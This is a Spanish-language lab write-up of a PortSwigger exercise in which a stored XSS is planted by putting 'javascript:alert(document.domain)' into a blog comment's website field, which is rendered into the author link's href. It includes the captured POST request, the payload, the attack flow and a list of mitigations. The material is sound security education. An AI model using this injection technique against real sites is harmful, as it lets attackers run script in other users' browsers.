---
title: "Stored XSS into anchor href attribute with double quotes HTML-encoded"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded"
author: "Z4k7"
date: "2026-05-01"
year: "2026"
status: "pwned"
tags:
  - "XSS"
  - "Stored"
  - "AnchorHref"
techniques:
  - "Stored XSS"
  - "Anchor Href Injection"
  - "Data Persistence"
tools:
  - "BurpSuite"
  - "Repeater"
flags_list:
  - label: "alert"
    value: "Ejecutado exitosamente document.domain"
summary: "Laboratorio de XSS Almacenado en la funcionalidad de comentarios de un blog. La entrada del usuario se guarda en la base de datos y se refleja cuando otros usuarios ven el comentario. La solución requiere inyectar código JavaScript en el atributo href de un anchor tag dentro del campo website del comentario. Aunque las comillas dobles están codificadas en HTML, el payload utiliza javascript: protocol para ejecutar código cuando se hace clic en el nombre del autor.  ---"
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio contiene una vulnerabilidad de secuencias de comandos entre sitios almacenada en la funcionalidad de comentarios. Para resolver este laboratorio, envíe un comentario que llame a la `alert`función que se activa al hacer clic en el nombre del autor del comentario.

  - id: "recon_1"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Iniciamos el laboratorio y accedemos en la URL:
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20anchor%20href%20attribute%20with%20double%20quotes%20HTML-encoded/file-20260424204628658.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Ingresamos en el apartado de los comentarios para poder consultar el comportamiento de la solicitud en este caso `web-security-academy.net/post?postId=10`
          Consultando el código fuente de la web no contamos con script que manipule la solicitud
          Enviamos como primera validación una solicitud desde el formulario de comentarios para validar el comportamiento.
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20anchor%20href%20attribute%20with%20double%20quotes%20HTML-encoded/file-20260424204921105.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Se envía una solicitud POST con los siguientes datos
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20anchor%20href%20attribute%20with%20double%20quotes%20HTML-encoded/file-20260424205141950.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Una vez de se envía la solicitud de la creación de un comentario en la web en el apartado del autor de la misma genera o adiciona a la url un apartado con el comentario de la ingresado por el autor.
      - kind: "code"
        lang: "HTML"
        code: |
          <p>
              <img src="/resources/images/avatarDefault.svg" class="avatar">                            <a id="author" href="https://0a9100770375b2228532086e00ca001d.web-security-academy.net/'-validacion-">z4k7</a> | 25 April 2026
          </p>
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El campo `website` del comentario se refleja directamente en el atributo `href` del anchor del autor. Aunque las comillas dobles están codificadas en HTML (`&quot;`), podemos usar `javascript:` protocol que no requiere comillas. El navegador interpreta `href='javascript:...'` como un protocolo especial que ejecuta código cuando se hace clic."

  - id: "enum_1"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Con el código anterior podríamos aplicar repeater y tratar se modificar la solicitud para ingresar directamente javascript.
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20anchor%20href%20attribute%20with%20double%20quotes%20HTML-encoded/file-20260424210701635.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Tendremos una solicitud por parte del formulario
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          POST /post/comment HTTP/1.1
          Host: 0a0b000b03c7619280e4bc8e00ca0080.web-security-academy.net
          Cookie: session=JwJae2pUXA7bIcFDeUxdP9l9dcNdo62a
          Content-Length: 198
          Cache-Control: max-age=0
          Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
          Sec-Ch-Ua-Mobile: ?0
          Sec-Ch-Ua-Platform: "Windows"
          Accept-Language: es-419,es;q=0.9
          Origin: https://0a0b000b03c7619280e4bc8e00ca0080.web-security-academy.net
          Content-Type: application/x-www-form-urlencoded
          Upgrade-Insecure-Requests: 1
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
          Sec-Fetch-Site: same-origin
          Sec-Fetch-Mode: navigate
          Sec-Fetch-User: ?1
          Sec-Fetch-Dest: document
          Referer: https://0a0b000b03c7619280e4bc8e00ca0080.web-security-academy.net/post?postId=10
          Accept-Encoding: gzip, deflate, br
          Priority: u=0, i
          Connection: keep-alive
          
          csrf=EvuS1oFrNEujO3XapEcOeoL68ekGZTjl&postId=10&comment=z4k7&name=z4k7&email=z4k7%40gmail.com&website=https%3A%2F%2F0a9100770375b2228532086e00ca001d.web-security-academy.net%2F%26apos%3B-validacion-
      - kind: "note"
        text: |
          Podemos enviar la solicitud a repeater y tratar de modificar la web para enviar `javascript:alert(document.domain)`
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20anchor%20href%20attribute%20with%20double%20quotes%20HTML-encoded/file-20260424210958746.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Enviamos la solicitud y consultamos si quedo almacenada la información
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20anchor%20href%20attribute%20with%20double%20quotes%20HTML-encoded/file-20260424211133251.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Contamos con una respuesta de confirmación
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20anchor%20href%20attribute%20with%20double%20quotes%20HTML-encoded/file-20260424211214306.jpg"
        caption: "Evidencia técnica"
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20anchor%20href%20attribute%20with%20double%20quotes%20HTML-encoded/file-20260424211229376.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Damos click y se confirma la ejecución del código
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20anchor%20href%20attribute%20with%20double%20quotes%20HTML-encoded/file-20260424211303362.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El ataque XSS Almacenado persiste en la base de datos. Cuando otros usuarios (o la víctima simulada en el lab) ven el comentario y hacen clic en el nombre del autor, el JavaScript se ejecuta. Esto es diferente a Reflected XSS que requiere que la víctima siga un link especial."

  - id: "exploit_1"
    num: "04"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          El payload que se inyecta en el campo `website`:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          javascript:alert(document.domain)
      - kind: "note"
        text: |
          El navegador renderiza:
      - kind: "code"
        lang: "HTML"
        code: |
          <a id="author" href="javascript:alert(document.domain)">z4k7</a>
      - kind: "note"
        text: |
          Aunque las comillas dobles estén codificadas en HTML (`&quot;`), el protocolo `javascript:` no necesita comillas - funciona directamente como valor de href.
          El flujo de ataque:
          1. Atacante completa formulario de comentario
          2. En campo `website`, ingresa: `javascript:alert(document.domain)`
          3. En campo `name`, ingresa el nombre del autor que aparecerá
          4. Solicitud POST se envía a `/post/comment`
          5. El servidor almacena el comentario en base de datos
          6. Cuando otros usuarios o víctimas ven el post, ven el comentario
          7. Si hacen clic en el nombre del autor (que es un anchor link)
          8. Se ejecuta `javascript:alert(document.domain)`
          9. El ataque persiste mientras el comentario esté almacenado
      - kind: "image"
        src: "assets/images/Stored%20XSS%20into%20anchor%20href%20attribute%20with%20double%20quotes%20HTML-encoded/file-20260424211229376.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El protocolo `javascript:` es especial en anchors. Cuando el navegador ve: - `href='javascript:...'` - No intenta navegar a una URL - En su lugar, ejecuta el código JavaScript - No requiere comillas adicionales alrededor del código - Funciona aunque las comillas dobles estén codificadas en el href"

  - id: "exploit"
    num: "05"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          El payload final en el campo website:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          javascript:alert(document.domain)
      - kind: "note"
        text: |
          Datos POST completos:
      - kind: "code"
        lang: "BASH"
        code: |
          csrf=TOKEN&postId=10&comment=z4k7&name=z4k7&email=z4k7@gmail.com&website=javascript:alert(document.domain)
      - kind: "note"
        text: |
          Una vez almacenado y cuando un usuario hace clic en el nombre del autor:
          1. El navegador interpreta el href
          2. Ve que comienza con `javascript:`
          3. Ejecuta el código: `alert(document.domain)`
          4. La alerta se muestra

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "alert"
        value: "Ejecutado exitosamente document.domain"

lessons:
  - 'XSS Almacenado es más peligroso que Reflected - persiste en la base de datos'
  - 'El protocolo `javascript:` en atributos href ejecuta código sin necesidad de event handlers'
  - 'La codificación HTML de comillas no protege contra `javascript:` protocol'
  - 'Los campos de formulario que se guardan en base de datos son vectores de ataque persistentes'
  - 'El nombre del autor es a menudo un anchor clickeable - vector perfecto para explotación'
  - 'Una sola inyección afecta a TODOS los usuarios que ven ese contenido'
  - 'Requiere interacción (clic) pero el payload persiste indefinidamente'
mitigation:
  - 'Validar que el campo website contenga una URL válida (protocolo http/https)'
  - 'Rechazar payloads que contengan `javascript:`, `data:`, `vbscript:`'
  - 'Usar whitelist de protocolos permitidos: solo `http://` y `https://`'
  - 'Sanitizar entrada usando bibliotecas como DOMPurify'
  - 'Escapar todas las URLs antes de insertar en atributos href'
  - 'Implementar Content Security Policy con `script-src ''self''`'
  - 'Validar en servidor - no confiar solo en validación cliente'
  - 'Considerar usar atributos `rel="noopener noreferrer"` en anchors de usuario'
  - 'Auditar regularmente comentarios almacenados para payloads sospechosos'
---
